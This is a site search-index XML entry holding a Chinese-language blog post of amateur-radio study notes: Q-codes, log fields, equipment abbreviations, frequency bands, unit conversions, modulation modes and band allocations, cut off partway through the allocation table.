<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>无线电</title>
      <link href="/posts/wu-xian-dian/"/>
      <url>/posts/wu-xian-dian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="📡-业余无线电常用-Q-简语表"><a href="#📡-业余无线电常用-Q-简语表" class="headerlink" title="📡 业余无线电常用 Q 简语表"></a>📡 业余无线电常用 Q 简语表</h2><div class = "md-table"><table><thead><tr><th>Q简语</th><th>全称 (英文)</th><th align="left">中文释义</th><th>使用频率</th></tr></thead><tbody><tr><td><strong>QSL</strong></td><td>Can you acknowledge receipt?</td><td align="left">确认收妥（我已收到&#x2F;请确认）</td><td>★★★★★</td></tr><tr><td><strong>QTH</strong></td><td>What is your location?</td><td align="left">位置（我的位置是…&#x2F;你的位置在哪）</td><td>★★★★★</td></tr><tr><td><strong>QRM</strong></td><td>Is my transmission being interfered with?</td><td align="left">干扰（有人为干扰&#x2F;杂音）</td><td>★★★★★</td></tr><tr><td><strong>QRN</strong></td><td>Are you troubled by static?</td><td align="left">天电干扰（雷电&#x2F;自然杂音）</td><td>★★★★☆</td></tr><tr><td><strong>QRZ</strong></td><td>Who is calling me?</td><td align="left">谁在呼叫我？（呼叫某台后回应“QRZ?”）</td><td>★★★★☆</td></tr><tr><td><strong>QRP</strong></td><td>Shall I decrease power?</td><td align="left">小功率（低功率发射&#x2F;我在用小功率）</td><td>★★★★☆</td></tr><tr><td><strong>QSB</strong></td><td>Is my signal fading?</td><td align="left">信号衰落（信号忽强忽弱）</td><td>★★★★☆</td></tr><tr><td><strong>QSO</strong></td><td>Can you communicate with…?</td><td align="left">通联（通信&#x2F;联络一次）</td><td>★★★★☆</td></tr><tr><td><strong>QSY</strong></td><td>Shall I change to another frequency?</td><td align="left">转频（转到其他频率&#x2F;频道）</td><td>★★★★☆</td></tr><tr><td><strong>QRT</strong></td><td>Shall I stop sending?</td><td align="left">停止发射（我下线&#x2F;关机了）</td><td>★★★★☆</td></tr><tr><td><strong>QRV</strong></td><td>Are you ready?</td><td align="left">我已准备就绪（可通联）</td><td>★★★☆☆</td></tr><tr><td><strong>QRL</strong></td><td>Are you busy?</td><td align="left">占用（此频率已有人使用&#x2F;忙碌中）</td><td>★★★☆☆</td></tr><tr><td><strong>QRO</strong></td><td>Shall I increase power?</td><td align="left">大功率（我在用高功率）</td><td>★★★☆☆</td></tr><tr><td><strong>QRG</strong></td><td>Will you tell me my exact frequency?</td><td align="left">频率（实际频率是多少）</td><td>★★☆☆☆</td></tr><tr><td><strong>QTR</strong></td><td>What is the correct time?</td><td align="left">时间（请报时&#x2F;当地时间）</td><td>★★☆☆☆</td></tr><tr><td><strong>QSK</strong></td><td>Can you hear me between your signals?</td><td align="left">可插话（半双工&#x2F;允许中途打断）</td><td>★☆☆☆☆</td></tr><tr><td><strong>QTC</strong></td><td>How many messages have you to send?</td><td align="left">电报&#x2F;消息（有多少信息要发？）</td><td>★☆☆☆☆</td></tr><tr><td><strong>QSP</strong></td><td>Will you relay a message?</td><td align="left">转达（请帮我中继转发消息）</td><td>★☆☆☆☆</td></tr></tbody></table></div><p>📌 <strong>总结：</strong></p><ul><li>最常用的 Q 简语是 <strong>QSL、QTH、QRM、QRN、QRZ、QRP、QSB、QSO、QSY、QRT</strong>，这些几乎每个业余电台都会用。</li><li>一般新手先记住 <strong>QSL（确认）、QTH（位置）、QRM（干扰）、QSO（通联）、QSY（转频）</strong> 就能顺畅交流。</li><li>其他如 <strong>QTR、QSP、QSK</strong> 在业余无线电场合较少用，多见于正式通信或电台比赛。</li></ul><h2 id="通联日志必记的主要字段"><a href="#通联日志必记的主要字段" class="headerlink" title="通联日志必记的主要字段"></a>通联日志必记的主要字段</h2><p><strong>记忆口诀</strong>（中文首字母联想）：</p><blockquote><p><strong>“呼日时频模信” → 呼号、日期、时间、频率、模式、信号报告</strong><br> 这样一眼就知道必填六要素。</p></blockquote><p>在业余无线电中，通常称为 <strong>QSO日志</strong>（QSO Log），常用字段如下：</p><div class = "md-table"><table><thead><tr><th>字段</th><th>英文</th><th>中文释义</th><th>重要性 &#x2F; 记忆方法</th></tr></thead><tbody><tr><td><strong>呼号</strong></td><td>Callsign</td><td>对方台站呼号</td><td>★★★★★ 最关键，可用“对方ID”记忆</td></tr><tr><td><strong>日期</strong></td><td>Date</td><td>通联日期（YYYY-MM-DD）</td><td>★★★★★ 每次通联都要记</td></tr><tr><td><strong>时间</strong></td><td>Time (UTC)</td><td>通联时间（推荐UTC）</td><td>★★★★★ 用“UTC统一时间”避免时差混淆</td></tr><tr><td><strong>频率 &#x2F; 波段</strong></td><td>Frequency &#x2F; Band</td><td>通联的频率或波段</td><td>★★★★☆ 可记作“HF&#x2F;50MHz&#x2F;144MHz等”</td></tr><tr><td><strong>模式</strong></td><td>Mode</td><td>通信模式（SSB、CW、FT8等）</td><td>★★★★☆ 用字母缩写记忆，容易区分</td></tr><tr><td><strong>信号报告</strong></td><td>RST</td><td>信号强度、清晰度报告</td><td>★★★★☆ R&#x3D;强度(1-9)、S&#x3D;清晰度(1-9)、T&#x3D;音调(1-9)</td></tr><tr><td><strong>QTH</strong></td><td>Location</td><td>对方地理位置</td><td>★★★★☆ 可用城市或格点网格LOCATOR记忆</td></tr><tr><td><strong>姓名</strong></td><td>Name</td><td>对方姓名</td><td>★★★☆☆ 主要用于友情记录</td></tr><tr><td><strong>备注</strong></td><td>Remarks</td><td>天气、设备、特别事件</td><td>★★★☆☆ 可灵活记录</td></tr></tbody></table></div><h2 id="电台天线及其它设备常用简语"><a href="#电台天线及其它设备常用简语" class="headerlink" title="电台天线及其它设备常用简语"></a>电台天线及其它设备常用简语</h2><div class = "md-table"><table><thead><tr><th>简语</th><th>英文全称</th><th>中文含义</th></tr></thead><tbody><tr><td><strong>WX</strong></td><td></td><td>天气</td></tr><tr><td><strong>ARDF或RDF</strong></td><td>(Amateur)Radio Direction Finding</td><td>（业余）无线电测向，竞赛或执法中用来定位无线电噪音源或者恶意干扰源</td></tr><tr><td><strong>ANT</strong></td><td>Antenna</td><td>天线</td></tr><tr><td><strong>YAGI</strong></td><td>Yagi-Uda Antenna</td><td>八木天线</td></tr><tr><td><strong>DIPOLE</strong></td><td>Dipole Antenna</td><td>偶极子天线</td></tr><tr><td><strong>GP</strong></td><td>Ground Plane Antenna</td><td>接地平面天线（垂直天线）</td></tr><tr><td><strong>VERT</strong></td><td>Vertical Antenna</td><td>垂直天线</td></tr><tr><td><strong>HOR</strong></td><td>Horizontal Antenna</td><td>水平天线</td></tr><tr><td><strong>BEAM</strong></td><td>Beam Antenna</td><td>定向天线</td></tr><tr><td><strong>LOOP</strong></td><td>Loop Antenna</td><td>环形天线</td></tr><tr><td><strong>WHIP</strong></td><td>Whip Antenna</td><td>鞭状天线</td></tr><tr><td><strong>LOG</strong> &#x2F; <strong>LPDA</strong></td><td>Log-Periodic Dipole Array</td><td>对数周期天线</td></tr><tr><td><strong>微波</strong></td><td>Microwave</td><td>（300 MHz–300 GHz）<strong>包含UHF、SHF、EHF。</strong><code>微波炉</code>的工作频率（2.45 GHz）在<code>UHF频段</code>内。</td></tr><tr><td><strong>EHF</strong></td><td>Extremely High Frequency</td><td>极高频（30–300 GHz） <code>毫米波</code>。【<strong>卫星中继</strong>】，必须点对点对准，可通过提高功率或天线增益弥补不足。</td></tr><tr><td><strong>SHF</strong></td><td>Super High Frequency</td><td>超高频（3–30 GHz） <code>厘米波</code>。其它同上。</td></tr><tr><td><strong>UHF</strong></td><td>Ultra High Frequency</td><td>特高频（300–3000 MHz**[3 GHz]<strong>）<code>分米波</code>。【<strong>基站中继接力</strong>】。用于</strong>Wi-Fi 2.4GHz**、<strong>家用微波炉 2.45GHz</strong>、GPS等。</td></tr><tr><td><strong>VHF</strong></td><td>Very High Frequency</td><td>甚高频（30–300 MHz）<code>米波</code>。【<strong>基站中继接力</strong>】，有一定的<code>绕射</code>能力，比<strong>HF</strong>稳定，用于<strong>FM广播</strong>、<strong>航空交通管制</strong>等。</td></tr><tr><td><strong>HF</strong></td><td>High Frequency</td><td>高频（3–30 MHz）。<code>波长</code>在<code>100m~10m</code>之间，又称<code>短波（Short Wave）</code>。可以被高空电离层反射回地面【<strong>天波传播</strong>】，从而实现<strong>超视距</strong>的极远距离、甚至全球通信。设备简单，成本低。但其高度依赖电离层的变化，而电离层又受太阳活动、日夜、季节影响极大，因此信号<strong>不稳定</strong>。用于<strong>远洋船舶&#x2F;航空通信、军事通信、业余无线电远程通联</strong>等。</td></tr><tr><td><strong>RF</strong></td><td>Radio Frequency</td><td>射频（3kHz–300GHz），<strong>作为载波，传输（AF信号等）信息</strong>。波长较短（从几米到毫米级），天线的尺寸可以与波长尺寸相当，易于实现。可以高效地通过天线以电磁波的形式<code>辐射</code>到空间中进行远距离传播。</td></tr><tr><td><strong>AF</strong></td><td>Audio Frequency</td><td>音频（16Hz–20MHz），<strong>基带信号</strong>，指<strong>信息本身</strong>，与<strong>RF载波</strong>无从属关系。频低波长（公里级）。因天线的尺寸需要与波长成正比，无法有效地以电磁波形式通过天线发射到远方。麦克风、耳机、音响设备利用导线<code>传导</code>方式传播！</td></tr><tr><td><strong>TRX或XCVR</strong></td><td>Transceiver</td><td>收发信机</td></tr><tr><td><strong>RX</strong></td><td>Receiver</td><td>接收机</td></tr><tr><td><strong>TX</strong></td><td>Transmitter</td><td>发射机</td></tr><tr><td><strong>PA</strong></td><td>Power Amplifier</td><td>功率放大器</td></tr><tr><td><strong>PSU</strong></td><td>Power Supply Unit</td><td>电源</td></tr><tr><td><strong>ATU</strong></td><td>Antenna Tuning Unit</td><td>天调（天线匹配器）</td></tr><tr><td><strong>SW</strong></td><td>Switch</td><td>开关</td></tr><tr><td><strong>SWR</strong></td><td>Standing Wave Ratio</td><td>驻波比</td></tr><tr><td><strong>KEY</strong></td><td>Key (Morse Key)</td><td>电键（CW电报发报键）</td></tr><tr><td><strong>MIC</strong></td><td>Microphone</td><td>麦克风</td></tr><tr><td><strong>SPK</strong></td><td>Speaker</td><td>扬声器</td></tr></tbody></table></div><h3 id="中、低频无线电波"><a href="#中、低频无线电波" class="headerlink" title="中、低频无线电波"></a><code>中、低频</code>无线电波</h3><div class = "md-table"><table><thead><tr><th align="left">频段</th><th align="left">频率范围</th><th align="left">主要传播方式</th><th align="left">核心特点</th><th align="left">主要应用场景</th></tr></thead><tbody><tr><td align="left"><strong>VLF</strong></td><td align="left">3-30 kHz</td><td align="left">地波、波导</td><td align="left"><strong>穿透海水、极稳定</strong></td><td align="left">军用对潜通信、远程导航、时间校准</td></tr><tr><td align="left"><strong>LF</strong></td><td align="left">30-300 kHz</td><td align="left">地波</td><td align="left"><strong>稳定、覆盖广</strong></td><td align="left">航空航海导航（NDB）、长波广播、电波钟</td></tr><tr><td align="left"><strong>MF</strong></td><td align="left">300-3000 kHz</td><td align="left"><strong>地波（昼）、天波（夜）</strong></td><td align="left"><strong>昼夜模式差异大</strong></td><td align="left"><strong>中波AM广播</strong>、海事通信</td></tr></tbody></table></div><h3 id="其它关键术语："><a href="#其它关键术语：" class="headerlink" title="其它关键术语："></a>其它关键术语：</h3><div class = "md-table"><table><thead><tr><th align="left">术语</th><th align="left">英文全称</th><th align="left">中文名称</th><th align="left">核心原理与功能</th><th align="left">应用场景与特点</th></tr></thead><tbody><tr><td align="left"><strong>PTT</strong></td><td align="left">Push-To-Talk</td><td align="left">手咪按键发射</td><td align="left"><strong>手动控制发射</strong>。按住按键，电台发射；松开按键，电台接收。</td><td align="left">最基础、最可靠的通话方式。用于所有类型的对讲机通话。</td></tr><tr><td align="left"><strong>VOX</strong></td><td align="left">Voice-Operated Exchange</td><td align="left">声控发射</td><td align="left"><strong>自动控制发射</strong>。通过麦克风检测声音，超过阈值自动发射，停止说话后自动接收。</td><td align="left">解放双手，适用于业余无线电、演习、施工等场景。在嘈杂环境易误触发。</td></tr><tr><td align="left"><strong>DTMF</strong></td><td align="left">Dual-Tone Multi-Frequency</td><td align="left">双音多频</td><td align="left"><strong>信令与控制</strong>。每按一个键发送<strong>两个特定频率音调</strong>的组合，用于传输指令。</td><td align="left">远程控制中继台、选择性呼叫特定电台、传输状态信息（如GPS）。</td></tr><tr><td align="left"><strong>NFM &#x2F; WFM</strong></td><td align="left">Narrowband &#x2F; Wideband FM</td><td align="left">窄带&#x2F;宽带调频</td><td align="left"><strong>调制方式</strong>。指频率调制的<strong>带宽（频偏）</strong> 不同。NFM更窄，适用于信道带宽 <code>25kHz/12.5kHz</code>的通信信号；WFM更宽，适用于接收信道带宽 <code>180kHz左右</code>的广播信号。</td><td align="left"><strong>NFM</strong>：绝大多数对讲机，<strong>FM</strong>在<strong>V&#x2F;UHF</strong>对讲机语境下，通常就指<strong>NFM</strong>。节省频谱，抗干扰，通信距离远，音质一般。<code>此模式下收听WFM信号，声音极度失真、嘶哑，无法辨认</code>           <strong>WFM</strong>：FM广播电台，音质极好，占用带宽大，易受干扰。<code>此模式下收听NFM信号，声音小且尖细沉闷</code></td></tr><tr><td align="left"><strong>SQL (Squelch)</strong></td><td align="left">Squelch</td><td align="left">静噪</td><td align="left"><strong>基于信号强度过滤</strong>。设定一个射频信号强度阈值，只有<strong>强于</strong>该阈值的信号才能打开扬声器。</td><td align="left"><strong>消除背景噪音</strong>。避免在无信号时听到“沙沙”声。是接收机的<strong>基础过滤</strong>功能。</td></tr><tr><td align="left"><strong>CTCSS</strong></td><td align="left">Continuous Tone-Coded Squelch System</td><td align="left">亚音静噪</td><td align="left"><strong>基于编码过滤</strong>。发射时在语音中<strong>叠加一个低频单音</strong>。接收机只打开那些<strong>包含相同特定单音</strong>的信号。</td><td align="left"><strong>解决同频干扰</strong>。在共享频率上只收听己方队友，忽略其他无关信号。<strong>不能加密</strong>。</td></tr></tbody></table></div><p>👉 提示：实际通联里，常见的交流内容多围绕 <strong>ANT（天线）、TRX（收发信机）、PA（功放）、PSU（电源）、ATU（天调）</strong>，其余在技术交流或 QSL 卡上会见到。</p><h2 id="无线电常用度量单位前缀（SI-Prefixes）"><a href="#无线电常用度量单位前缀（SI-Prefixes）" class="headerlink" title="无线电常用度量单位前缀（SI Prefixes）"></a>无线电常用度量单位前缀（SI Prefixes）</h2><p>⚠️ <strong>大小写必须区分</strong>，比如 m（毫，10⁻³）≠ M（兆，10⁶）。</p><div class = "md-table"><table><thead><tr><th>前缀</th><th>符号</th><th>10 的次方</th><th>中文含义</th></tr></thead><tbody><tr><td><strong>yotta</strong></td><td>Y</td><td>10²⁴</td><td>尧他</td></tr><tr><td><strong>zetta</strong></td><td>Z</td><td>10²¹</td><td>泽它</td></tr><tr><td><strong>exa</strong></td><td>E</td><td>10¹⁸</td><td>艾可</td></tr><tr><td><strong>peta</strong></td><td>P</td><td>10¹⁵</td><td>拍</td></tr><tr><td><strong>tera</strong></td><td>T</td><td>10¹²</td><td>太</td></tr><tr><td><strong>giga</strong></td><td>G</td><td>10⁹</td><td>吉</td></tr><tr><td><strong>mega</strong></td><td>M</td><td>10⁶</td><td>兆</td></tr><tr><td><strong>kilo</strong></td><td>k</td><td>10³</td><td>千</td></tr><tr><td><strong>hecto</strong></td><td>h</td><td>10²</td><td>百（较少用）</td></tr><tr><td><strong>deca</strong></td><td>da</td><td>10¹</td><td>十（较少用）</td></tr><tr><td><strong>—</strong></td><td>—</td><td>10⁰</td><td>无前缀（基准单位）</td></tr><tr><td><strong>deci</strong></td><td>d</td><td>10⁻¹</td><td>分（较少用）</td></tr><tr><td><strong>centi</strong></td><td>c</td><td>10⁻²</td><td>厘（较少用）</td></tr><tr><td><strong>milli</strong></td><td>m</td><td>10⁻³</td><td>毫</td></tr><tr><td><strong>micro</strong></td><td>µ</td><td>10⁻⁶</td><td>微</td></tr><tr><td><strong>nano</strong></td><td>n</td><td>10⁻⁹</td><td>纳</td></tr><tr><td><strong>pico</strong></td><td>p</td><td>10⁻¹²</td><td>皮</td></tr><tr><td><strong>femto</strong></td><td>f</td><td>10⁻¹⁵</td><td>飞</td></tr><tr><td><strong>atto</strong></td><td>a</td><td>10⁻¹⁸</td><td>阿</td></tr><tr><td><strong>zepto</strong></td><td>z</td><td>10⁻²¹</td><td>仄普</td></tr><tr><td><strong>yocto</strong></td><td>y</td><td>10⁻²⁴</td><td>幺科</td></tr></tbody></table></div><p>👉 在无线电里常见的单位组合有：</p><ul><li><strong>kHz &#x2F; MHz &#x2F; GHz</strong>（频率：千赫、兆赫、吉赫）</li><li><strong>mW &#x2F; W &#x2F; kW</strong>（功率：毫瓦、瓦、千瓦）</li><li><strong>mV &#x2F; V &#x2F; kV</strong>（电压：毫伏、伏、千伏）</li><li><strong>pF &#x2F; nF &#x2F; µF</strong>（电容：皮法、纳法、微法）</li></ul><hr><p>📌 <strong>总结</strong>：</p><ul><li>电台设备常用缩写如 <strong>ANT（天线）、TRX（收发信机）、PA（功放）、PSU（电源）、ATU（天调）</strong> 等，记住即可应付大部分通联话题。</li><li>SI 前缀必须区分大小写，常见的有 <strong>k（10³）、M（10⁶）、G（10⁹）、m（10⁻³）、µ（10⁻⁶）、n（10⁻⁹）、p（10⁻¹²）</strong>。</li></ul><h2 id="📡-无线电常用换算速查表"><a href="#📡-无线电常用换算速查表" class="headerlink" title="📡 无线电常用换算速查表"></a>📡 无线电常用换算速查表</h2><h3 id="1-功率-↔-dB-对照"><a href="#1-功率-↔-dB-对照" class="headerlink" title="1. 功率 ↔ dB 对照"></a>1. 功率 ↔ dB 对照</h3><table><thead><tr><th>功率</th><th>dBW</th><th>dBm</th></tr></thead><tbody><tr><td>1 mW</td><td>-30 dBW</td><td>0 dBm</td></tr><tr><td>1 W</td><td>0 dBW</td><td>30 dBm</td></tr><tr><td>10 W</td><td>10 dBW</td><td>40 dBm</td></tr><tr><td>100 W</td><td>20 dBW</td><td>50 dBm</td></tr><tr><td>1 kW</td><td>30 dBW</td><td>60 dBm</td></tr></tbody></table><p>👉 <strong>记忆口诀</strong>：</p><ul><li>10 倍功率 &#x3D; +10 dB</li><li>2 倍功率 ≈ +3 dB</li><li>dBm &#x3D; dBW + 30</li><li>dBμ &#x3D; dBm + 30</li><li>✅ 注意：这个 +30 是 <strong>固定关系</strong>，不是直接单位换算，而是因为参考功率不同。</li></ul><h5 id="定义如下"><a href="#定义如下" class="headerlink" title="定义如下"></a>定义如下</h5><p>✅ 注意：1 W &#x3D; 1000 mW &#x3D; 1,000,000 μW</p><blockquote><p>dBW &#x3D; 10 * log₁₀(P &#x2F; 1W)<br>dBm &#x3D; 10 * log₁₀(P &#x2F; 1mW)<br>dBμ &#x3D; 10 * log₁₀(P &#x2F; 1μW)</p></blockquote><p>即，0dBW &#x3D; 30dBm &#x3D; 60dBμ</p><p>📌 <strong>应用场景</strong>：</p><ul><li>选购对讲机（5 W ≈ 37 dBm）、车台（25 W ≈ 44 dBm）、台站功放（100 W ≈ 50 dBm）。</li><li>比较设备规格书：有的写“10 W”，有的写“40 dBm”，能快速对照。</li></ul><h3 id="2-频率-↔-波长"><a href="#2-频率-↔-波长" class="headerlink" title="2. 频率 ↔ 波长"></a>2. 频率 ↔ 波长</h3><p><strong>👉 换算公式</strong>：</p><p>✅ 注意： c ≈ 3×10^8 m&#x2F;s.</p><blockquote><p>λ(m) &#x3D; c &#x2F; f(Hz)&#x3D;300 &#x2F; f(MHz)</p></blockquote><table><thead><tr><th>频率 (MHz)</th><th>波长 (m)</th></tr></thead><tbody><tr><td>3.5 MHz</td><td>85.7 m</td></tr><tr><td>7.0 MHz</td><td>42.9 m</td></tr><tr><td>14 MHz</td><td>21.4 m</td></tr><tr><td>28 MHz</td><td>10.7 m</td></tr><tr><td>50 MHz</td><td>6.0 m</td></tr><tr><td>144 MHz</td><td>2.08 m</td></tr><tr><td>430 MHz</td><td>0.698 m</td></tr><tr><td>1296 MHz</td><td>0.231 m</td></tr></tbody></table><h3 id="3-天线增益"><a href="#3-天线增益" class="headerlink" title="3. 天线增益"></a>3. 天线增益</h3><ul><li><strong>dBi</strong>：相对全向天线</li><li><strong>dBd</strong>：相对半波振子</li></ul><p>👉 <strong>换算公式</strong>：</p><blockquote><p>G(dBi) &#x3D; G(dBd) + 2.15</p></blockquote><p>若天线增益为 5 dBd，则等效于：5 + 2.15 &#x3D; 7.15 dBi</p><p>📌 <strong>应用场景</strong>：</p><ul><li>购买天线时，有的厂商写“5 dBi”，有的写“3 dBd”，要换算对比。</li><li>计算链路预算时，使用 dBi。</li></ul><h3 id="4-电平与灵敏度"><a href="#4-电平与灵敏度" class="headerlink" title="4. 电平与灵敏度"></a>4. 电平与灵敏度</h3><p><strong>dBm ↔ μV (电压)</strong>：在 50Ω 下：</p><table><thead><tr><th>电平 (dBm)</th><th>电压 (μV)</th></tr></thead><tbody><tr><td>-113 dBm</td><td>0.5 μV</td></tr><tr><td>-107 dBm</td><td>1.0 μV</td></tr><tr><td>-97 dBm</td><td>3.2 μV</td></tr><tr><td>-77 dBm</td><td>32 μV</td></tr></tbody></table><p>📌 <strong>应用场景</strong>：</p><ul><li>接收机灵敏度指标：厂家常写“-120 dBm”或“0.25 μV”。</li><li>调试电台时，对比不同接收机灵敏度。</li></ul><h3 id="🛠️-小结"><a href="#🛠️-小结" class="headerlink" title="🛠️ 小结"></a>🛠️ 小结</h3><p>业余无线电爱好者最常用的单位换算有：</p><ol><li><strong>功率 ↔ dBm&#x2F;dBW</strong>（设备功率比较）</li><li><strong>频率 ↔ 波长</strong>（天线设计与调频）</li><li><strong>天线增益 dBi ↔ dBd</strong>（天线性能对比）</li><li><strong>接收灵敏度 dBm ↔ μV</strong>（电台性能评估）</li></ol><h2 id="非电离辐射-vs-电离辐射"><a href="#非电离辐射-vs-电离辐射" class="headerlink" title="非电离辐射 vs. 电离辐射"></a>非电离辐射 vs. 电离辐射</h2><ul><li><strong>电离辐射</strong>：<ul><li><strong>是什么</strong>： 指能量极高、波长极短的辐射，如X射线、γ射线、部分紫外线。</li><li><strong>能力</strong>： 其能量足以<strong>击穿原子核外的电子，使原子发生电离</strong>。这种对细胞和DNA结构的直接破坏是致癌和引发放射病的主要原因。</li><li><strong>来源</strong>： 核辐射、CT检查、X光拍片等。</li></ul></li><li><strong>非电离辐射</strong>：<ul><li><strong>是什么</strong>： 指能量较低、波长较长的辐射。<strong>所有无线电波，包括卫星信号、手机信号、Wi-Fi、广播、微波炉微波，都属于这个范畴。</strong></li><li><strong>能力</strong>： 其能量<strong>远远不足以</strong>使原子发生电离。它最主要的作用是<strong>热效应</strong>，即使物质分子振动摩擦而产生热量。</li><li><strong>来源</strong>： 太阳光（可见光、部分紫外线）、所有家用无线设备、电力线等</li></ul></li></ul><h2 id="常考调制方式"><a href="#常考调制方式" class="headerlink" title="常考调制方式"></a>常考调制方式</h2><div class = "md-table"><table><thead><tr><th>模式类别</th><th>具体模式举例</th><th>工作原理简介</th><th>带宽</th><th>主要特点与应用场景</th></tr></thead><tbody><tr><td><strong>调幅 (AM)</strong></td><td>AM</td><td>载波<strong>幅度</strong>随音频信号变化。</td><td>~6 kHz</td><td><strong>优点</strong>：接收简单，兼容性好。 <strong>缺点</strong>：功率效率低，抗干扰差。 <strong>应用</strong>：航空波段、广播，业余中少用。</td></tr><tr><td><strong>调频 (FM)</strong></td><td>FM（宽带FM）、窄带FM (NFM)</td><td>载波<strong>频率</strong>随音频信号变化。</td><td>宽带FM ~15 kHz，NFM ~12.5 kHz</td><td><strong>优点</strong>：音质清晰，抗噪声好。 <strong>缺点</strong>：带宽占用大，不适合HF。 <strong>应用</strong>：VHF&#x2F;UHF中继通信、手台、车台。</td></tr><tr><td><strong>单边带 (SSB)</strong></td><td>LSB（低边带）、USB（高边带）</td><td><strong>去掉载波和一侧边带</strong>，仅传输单边带信息。</td><td>~2.4–3 kHz</td><td><strong>优点</strong>：功率效率高，抗干扰强，适合远程。 <strong>缺点</strong>：需要精确调谐。 <strong>应用</strong>：HF远程通联、DX、竞赛。</td></tr><tr><td><strong>等幅报 (CW)</strong></td><td>CW (莫尔斯电码)</td><td>通过<strong>开启和关闭载波</strong>传输“点”“划”。</td><td>极窄 (~150 Hz)</td><td><strong>优点</strong>：极高的效率，信噪比差时仍可解码。 <strong>缺点</strong>：需掌握电码。 <strong>应用</strong>：DX远程、弱信号、应急通信。</td></tr><tr><td><strong>数字模式 (传统)</strong></td><td>RTTY（无线电传）</td><td>使用<strong>FSK（频移键控）</strong>，两个频率分别代表“1”和“0”。</td><td>~250 Hz</td><td><strong>优点</strong>：抗干扰强，是早期数字通信代表。 <strong>缺点</strong>：速率慢。 <strong>应用</strong>：竞赛、新闻广播。</td></tr><tr><td></td><td>SSTV（慢扫描电视）</td><td>将图像编码为音频信号，通过SSB传输，解码还原图片。</td><td>~3 kHz</td><td><strong>优点</strong>：能传图像。 <strong>缺点</strong>：传输耗时长。 <strong>应用</strong>：ISS活动、业余爱好者图片通联。</td></tr><tr><td><strong>数字模式 (现代)</strong></td><td>FT8、JS8Call、WSPR</td><td>通过<strong>极窄带数字编码</strong>，计算机解码，信噪比-20dB下仍能解码。</td><td>~50 Hz</td><td><strong>优点</strong>：极弱信号通信，自动化。 <strong>缺点</strong>：交互性差，信息量少。 <strong>应用</strong>：DX、传播研究、自动报告。</td></tr><tr><td></td><td>D-STAR、C4FM、DMR</td><td>数字语音模式，将语音数字化并打包传输。</td><td>~12.5 kHz</td><td><strong>优点</strong>：音质佳，支持数据（短信、GPS）。 <strong>缺点</strong>：需专用设备，互通性差。 <strong>应用</strong>：数字中继、应急网络。</td></tr></tbody></table></div><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><ol><li><strong>本地通联（VHF&#x2F;UHF）</strong>：首选 <strong>FM</strong>。音质好，操作简单。如果想尝试数字功能，可以探索 <strong>DMR</strong>、<strong>C4FM</strong> 或 <strong>D-STAR</strong>。</li><li><strong>远距离通联（HF）</strong>：语音通信绝对主力是 <strong>SSB</strong>。如果你想挑战更远的距离和更弱的信号，<strong>CW</strong> 和 <strong>FT8</strong> 等数字模式是强大工具。</li><li><strong>学习与入门</strong>：从FM开始最容易上手。但要深入业余无线电的精髓，必须掌握SSB的操作和调谐技巧。</li><li><strong>应急准备</strong>：SSB（HF）、CW、FT8 因其远距离和高效的特点，是应急通信的首选。本地则可以使用FM或数字模式。</li></ol><h2 id="专用、主要、次要任务-一览表"><a href="#专用、主要、次要任务-一览表" class="headerlink" title="专用、主要、次要任务&#96;一览表"></a>专用、主要、次要任务&#96;一览表</h2><p>常见业余 &#x2F; 卫星业余频段按“<strong>专用（业余为唯一主要） &#x2F; 主要（业余为主要之一，和其它业务共用） &#x2F; 次要（业余为次要，须让行）</strong>”进行了尽量完整的整理，并在“业余为次要”的行里补充了当时的主要业务（谁优先）。表格以 <strong>≤30 MHz</strong> 为主，同时加上几个常考的 VHF&#x2F;UHF 例子（50、144、430 MHz）供你参考：</p><div class = "md-table"><table><thead><tr><th>频段（MHz）</th><th>波段俗称</th><th>我国业务地位（业余&#x2F;卫星）</th><th>当业余为“次要”时的主要业务（谁优先）</th><th>备注 &#x2F; 拆分说明</th></tr></thead><tbody><tr><td>0.1357–0.1378</td><td>2200 m</td><td><strong>次要</strong>（业余为次要）</td><td><strong>主要：固定业务 &#x2F; 海事移动（radiobeacon&#x2F;海事）等</strong>（国际上此段对业余为次要、EIRP 限制） 。(<a href="https://en.wikipedia.org/wiki/2200-meter_band?utm_source=chatgpt.com">维基百科</a>)</td><td>WRC-07 后在多数国家作为业余次要分配（EIRP 限制）。</td></tr><tr><td>1.8–2.0</td><td>160 m</td><td><strong>主要（与其他业务共用、业余为主要之一）</strong>。(<a href="https://nxww.nx.gov.cn/bsfw/ywgl/bgxz/201808/P020220319742052081161.pdf?utm_source=chatgpt.com">宁夏无线电管理委员会</a>)</td><td>—</td><td>我国和多数地区把 1.8–2.0 列为业余主要使用（考试资料常列为“主要”）。</td></tr><tr><td>3.5–3.9</td><td>80 m</td><td><strong>主要（共用、业余为主要之一）</strong>。(<a href="https://nxww.nx.gov.cn/bsfw/ywgl/bgxz/201808/P020220319742052081161.pdf?utm_source=chatgpt.com">宁夏无线电管理委员会</a>)</td><td>—</td><td>常见短波夜间 DX 波段。</td></tr><tr><td>7.0–7.3（区域差）</td><td>40 m</td><td><strong>专用 &#x2F;（业余专用 — 即业余为唯一主要）</strong>（我国通常列为业余专用）。(<a href="https://ham.ink/c.htm?utm_source=chatgpt.com">Ham Ink</a>)</td><td>—</td><td>各区上限略有差异；考试中常记“7MHz 属业余专用”。</td></tr><tr><td>10.1–10.15</td><td>30 m</td><td><strong>次要（业余为次要）</strong>。(<a href="https://nxww.nx.gov.cn/bsfw/ywgl/bgxz/201808/P020220319742052081161.pdf?utm_source=chatgpt.com">宁夏无线电管理委员会</a>)</td><td><strong>主要：固定业务（短波链路&#x2F;固定服务）等</strong>（多数国家&#x2F;表格把 10.1–10.15 对业余为次要，固定为主要）。</td><td>WARC 30m，但在很多国家（含中国考试材料）业余为次要，要让行。</td></tr><tr><td>14.00–14.25</td><td>20 m（下部）</td><td><strong>专用 &#x2F;（业余专用）</strong>（我国把 14.00–14.25 作为业余专用）。(<a href="https://ezirmusitua.site/blog/ham-radio-level-b-questions?utm_source=chatgpt.com">三水言己</a>)</td><td>—</td><td>14.00–14.25 常被标为“专用”，14.25–14.35 则归作“主要&#x2F;共用”区段（见下行）。</td></tr><tr><td>14.25–14.35</td><td>20 m（上部）</td><td><strong>主要（业余为主要之一）</strong>。(<a href="https://ezirmusitua.site/blog/ham-radio-level-b-questions?utm_source=chatgpt.com">三水言己</a>)</td><td>—</td><td>20m 波段在 14.25–14.35 部分为共用&#x2F;主要，考试题常拆开考。</td></tr><tr><td>18.068–18.168</td><td>17 